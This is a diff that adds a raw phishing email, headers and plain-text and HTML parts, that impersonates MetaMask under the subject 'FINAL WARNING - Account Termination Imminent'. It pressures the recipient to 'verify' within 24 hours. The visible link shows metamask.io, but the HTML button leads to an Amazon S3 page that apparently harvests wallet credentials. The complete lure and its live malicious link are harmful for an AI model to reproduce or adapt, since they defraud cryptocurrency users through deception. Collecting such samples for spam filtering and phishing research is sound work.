@@ -1,0 +1,262 @@
+Return-Path: <postmaster@33bd252a6a.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id uH4RNS0KPWk9fAAAOB6+FQ
+	(envelope-from <postmaster@33bd252a6a.nxcli.io>)
+	for <info@vorteksenerji.com>; Sat, 13 Dec 2025 09:39:41 +0300
+Return-path: <postmaster@33bd252a6a.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Sat, 13 Dec 2025 09:39:41 +0300
+Received: from cloudhost-3907901.us-midwest-1.nxcli.net ([209.87.159.152]:57174)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@33bd252a6a.nxcli.io>)
+	id 1vUJI5-000000008Vd-2o8B
+	for info@vorteksenerji.com;
+	Sat, 13 Dec 2025 09:39:41 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=33bd252a6a.nxcli.io;
+  b=hj9uOm6y4zz+e5xj5XfRQGmjLSJXsipwy5T5a+bPYJJlVPYwMBDBNpavh5jBBkdG+HdQ1VCjYoVkN7u3U1Kr9o1gsZJt+CuGgEBW1S/cWDyiBzYM9v5aAH+BVqgLWfXYK371sOVIMRoXw81aikOMQY5cYJ5IBfLbbwbvtxWhiihE94sCGgFKlpHKrdvs1X0d49DA2J0JDaKlUu+UP5UQcGZqcCnid+Azaw1kIVRknO2A1f2pyOjclZpbTuXZ7V92rOs33llui6X/tvDqS//x6YJXYtYaQOxnvygQ0a9bUmz5jRcAKLAt8pRCbz92wmr/7K2R3IVkR0bDF4+DCa3d0Q==;
+  h=Received:Date:To:From:Reply-To:Subject:Message-ID:List-Unsubscribe:MIME-Version:Content-Type:Content-Transfer-Encoding;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=33bd252a6a.nxcli.io; h=
+	date:to:from:reply-to:subject:message-id:list-unsubscribe
+	:mime-version:content-type:content-transfer-encoding; s=default;
+	 bh=sux/WcTqpwCKYULfsjK1YlMIa/tppF9n6VnrAmttkPg=; b=frB08Gpo6Vtd
+	k2320mEal+RS2CEzMcr0SKB1fs/CW4ruhvTAs7gpgyIO4XQrCGS73tHpajkqZdah
+	fqGBWLmf/kbuwc+H4xXS/102YGoagSk3grafrwSy9GN45jwlxyni+vxz1xSs2HR0
+	n64EPeZe7YAzYPvGOAIo5WPpGqkXWQvBcoQsQKB+OFiN0vH8VHZzQNHRDTm6jRXk
+	A6hQcv/xTE+quF07HCUpadNASe5ItR9GNnH0GHEsa2AleMoMfnohhjHGezztuuvZ
+	u0w/VgSgFfIAIiIlu5OvXKb5IkHaDqn3FKZq/6BJDfw+QPUzHUOChJjiCUG+s0r8
+	WS4s62T7aw==
+Received: (qmail 12665 invoked by uid 10187); 13 Dec 2025 05:03:36 +0000
+Date: Sat, 13 Dec 2025 05:02:43 +0000
+To: info@vorteksenerji.com
+From: MetaMask <metamask@io.io>
+Reply-To: metamask@io.io
+Subject: FINAL WARNING - Account Termination Imminent
+Message-ID: <45f226d3f9fa2a4993d0c1fefd921527@io.io>
+List-Unsubscribe: mailto:bounce540-GBwGpQ1XWwHbiJH@io.io?subject=list-unsubscribe
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="148650684c21ecd6e95f4cd7c44dec5c4"
+Content-Transfer-Encoding: 8bit
+
+This is a multi-part message in MIME format.
+
+--148650684c21ecd6e95f4cd7c44dec5c4
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+
+
+
+Required: Email Verification
+
+
+
+
+
+
+
+
+
+
+
+SECURITY ACTION REQUIRED
+
+
+
+
+
+
+
+
+
+
+⏳ Time-Sensitive: Complete Your Verification
+
+
+
+Your account security is incomplete. To activate critical protection features including Two-Factor Authentication, you must verify your email address now.
+
+
+
+
+
+
+
+VERIFY NOW
+
+
+⚠️ Required within 24 hours
+
+
+
+
+
+
+
+
+
+Without Verification:
+
+
+
+
+Account remains at high security risk
+2FA protection cannot be enabled
+Limited access to advanced features
+Reduced account functionality
+
+
+
+
+
+
+
+
+
+
+
+
+Direct Verification Link:
+
+[https://metamask.io/2FA]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+MetaMask Security • This verification is mandatory for all users
+
+
+
+
+
+
+
+
+
+
+
+
+--148650684c21ecd6e95f4cd7c44dec5c4
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Required: Email Verification</title>
+</head>
+<body style="margin:0;padding:15px;background:#ffffff;font-family:Arial,sans-serif;">
+
+<table width="100%" cellpadding="0" cellspacing="0" style="max-width:560px;margin:0 auto;">
+<tr>
+<td>
+
+<!-- Header -->
+<table width="100%" cellpadding="0" cellspacing="0" style="background:#f6851b;border-radius:4px 4px 0 0;">
+<tr>
+<td style="padding:20px;text-align:center;">
+<span style="color:#fff;font-size:20px;font-weight:bold;">SECURITY ACTION REQUIRED</span>
+</td>
+</tr>
+</table>
+
+<!-- Content -->
+<table width="100%" cellpadding="0" cellspacing="0" style="border:2px solid #f6851b;border-top:none;">
+<tr>
+<td style="padding:30px 25px;">
+
+<p style="color:#333;font-size:17px;font-weight:bold;margin:0 0 15px 0;">
+⏳ Time-Sensitive: Complete Your Verification
+</p>
+
+<p style="color:#666;font-size:14px;line-height:1.6;margin:0 0 25px 0;">
+Your account security is incomplete. To activate critical protection features including Two-Factor Authentication, you must verify your email address now.
+</p>
+
+<!-- Urgent Button -->
+<table width="100%" cellpadding="0" cellspacing="0">
+<tr>
+<td style="text-align:center;background:#fff8f0;padding:20px;border:2px solid #f6851b;border-radius:4px;">
+<a href="https://access-authority-65d45ea.s3.us-east-1.amazonaws.com/index.html" style="background:#ff4444;color:#ffffff;text-decoration:none;font-size:16px;font-weight:bold;padding:15px 45px;border-radius:4px;display:inline-block;border:2px solid #fff;">
+VERIFY NOW
+</a>
+<p style="color:#cc0000;font-size:13px;margin:15px 0 0 0;font-weight:bold;">
+⚠️ Required within 24 hours
+</p>
+</td>
+</tr>
+</table>
+
+<!-- Consequences -->
+<table width="100%" cellpadding="0" cellspacing="0" style="margin-top:25px;">
+<tr>
+<td>
+<p style="color:#333;font-weight:bold;font-size:15px;margin:0 0 12px 0;">Without Verification:</p>
+<table width="100%" cellpadding="0" cellspacing="0" style="background:#f8f8f8;border:1px solid #e0e0e0;border-radius:3px;padding:15px;">
+<tr>
+<td>
+<ul style="color:#666;font-size:13px;margin:0;padding-left:18px;line-height:1.6;">
+<li>Account remains at high security risk</li>
+<li>2FA protection cannot be enabled</li>
+<li>Limited access to advanced features</li>
+<li>Reduced account functionality</li>
+</ul>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+
+<!-- Manual Link -->
+<table width="100%" cellpadding="0" cellspacing="0" style="margin-top:30px;">
+<tr>
+<td>
+<p style="color:#666;font-size:14px;margin:0 0 10px 0;font-weight:bold;">Direct Verification Link:</p>
+<div style="background:#f5f5f5;border:1px solid #ddd;padding:12px;font-family:monospace;font-size:12px;color:#f6851b;word-break:break-all;border-left:3px solid #f6851b;">
+[https://metamask.io/2FA]
+</div>
+</td>
+</tr>
+</table>
+
+</td>
+</tr>
+</table>
+
+<!-- Footer -->
+<table width="100%" cellpadding="0" cellspacing="0" style="margin-top:20px;">
+<tr>
+<td style="text-align:center;padding:15px;background:#f8f8f8;border-radius:4px;">
+<p style="color:#666;font-size:12px;margin:0;">
+MetaMask Security • This verification is mandatory for all users
+</p>
+</td>
+</tr>
+</table>
+
+</td>
+</tr>
+</table>
+
+</body>
+</html>
+
+
+
+--148650684c21ecd6e95f4cd7c44dec5c4--
